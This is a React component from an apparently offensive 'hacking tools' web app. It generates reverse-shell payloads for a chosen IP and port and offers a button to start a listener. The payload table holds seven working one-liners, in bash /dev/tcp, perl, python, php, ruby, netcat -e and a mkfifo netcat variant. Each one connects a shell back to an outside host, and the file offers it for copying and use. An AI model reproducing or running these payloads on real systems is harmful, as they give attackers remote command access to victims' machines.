import React, { useState } from 'react';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { executeHackingTool } from '@/utils/osintTools';
import { toast } from '@/components/ui/use-toast';
import { Terminal, Copy, Check } from 'lucide-react';

interface ReverseShellTabProps {
  isRealmode: boolean;
  isExecuting: boolean;
  setIsExecuting: (isExecuting: boolean) => void;
  setToolOutput: (output: string | null) => void;
}

const ReverseShellTab: React.FC<ReverseShellTabProps> = ({ isRealmode, isExecuting, setIsExecuting, setToolOutput }) => {
  const [customIp, setCustomIp] = useState('0.0.0.0');
  const [customPort, setCustomPort] = useState('4444');
  const [selectedRevShellPayload, setSelectedRevShellPayload] = useState('');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  
  const reverseShellPayloads = {
    'bash': `bash -i >& /dev/tcp/${customIp}/${customPort} 0>&1`,
    'perl': `perl -e 'use Socket;$i="${customIp}";$p=${customPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    'python': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${customIp}",${customPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    'php': `php -r '$sock=fsockopen("${customIp}",${customPort});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    'ruby': `ruby -rsocket -e'f=TCPSocket.open("${customIp}",${customPort}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    'netcat': `nc -e /bin/sh ${customIp} ${customPort}`,
    'netcat-no-e': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${customIp} ${customPort} >/tmp/f`
  };
  
  const handleCopyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopySuccess(type);
      setTimeout(() => setCopySuccess(null), 2000);
      toast({
        title: "Copied to clipboard!",
        description: `The ${type} has been copied to your clipboard.`,
      });
    });
  };
  
  const executeReverseShellTool = async () => {
    setIsExecuting(true);
    setToolOutput(null);
    
    try {
      if (!isRealmode) {
        toast({
          title: "Simulation Mode",
          description: "Enable Real Mode to start a listener",
        });
        return;
      }
      
      const result = await executeHackingTool({
        tool: 'listener',
        options: {
          ip: customIp,
          port: customPort,
          type: selectedRevShellPayload
        }
      });
      
      toast({
        title: "Listener Started",
        description: `Listening on ${customIp}:${customPort}`,
      });
      
      if (result?.data) {
        setToolOutput(typeof result.data === 'string' ? result.data : JSON.stringify(result.data, null, 2));
      }
    } catch (error) {
      console.error('Tool execution error:', error);
      setToolOutput(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      
      toast({
        title: "Execution Failed",
        description: error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive"
      });
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
          <Label htmlFor="ip">IP Address</Label>
          <Input 
            id="ip" 
            value={customIp} 
            onChange={(e) => setCustomIp(e.target.value)}
            className="bg-scanner-dark-alt border-gray-700"
          />
        </div>
        <div>
          <Label htmlFor="port">Port</Label>
          <Input 
            id="port" 
            value={customPort} 
            onChange={(e) => setCustomPort(e.target.value)}
            className="bg-scanner-dark-alt border-gray-700"
          />
        </div>
      </div>
      
      <div>
        <Label htmlFor="shell-type">Shell Type</Label>
        <Select 
          value={selectedRevShellPayload} 
          onValueChange={setSelectedRevShellPayload}
        >
          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
            <SelectValue placeholder="Select a shell type" />
          </SelectTrigger>
          <SelectContent className="bg-scanner-dark border-gray-700">
            {Object.keys(reverseShellPayloads).map((key) => (
              <SelectItem key={key} value={key}>{key}</SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>
      
      {selectedRevShellPayload && (
        <div className="mt-4">
          <Label>Generated Shell Command</Label>
          <div className="relative mt-1.5">
            <Textarea 
              readOnly 
              value={reverseShellPayloads[selectedRevShellPayload as keyof typeof reverseShellPayloads]}
              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
            />
            <Button 
              size="sm" 
              variant="outline" 
              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
              onClick={() => handleCopyToClipboard(
                reverseShellPayloads[selectedRevShellPayload as keyof typeof reverseShellPayloads], 
                'reverse shell command'
              )}
            >
              {copySuccess === 'reverse shell command' ? (
                <Check className="h-4 w-4" />
              ) : (
                <Copy className="h-4 w-4" />
              )}
            </Button>
          </div>
          <p className="text-gray-400 text-xs mt-2">
            This reverse shell payload creates a connection back to your listener at {customIp}:{customPort}
          </p>
          <div className="mt-4">
            <Button
              onClick={executeReverseShellTool}
              disabled={isExecuting || !isRealmode}
              variant="default"
              className="bg-scanner-primary"
            >
              <Terminal className="h-4 w-4 mr-2" />
              {isRealmode ? "Start Listener" : "Listener (Real Mode Only)"}
            </Button>
          </div>
        </div>
      )}
    </div>
  );
};

export default ReverseShellTab;
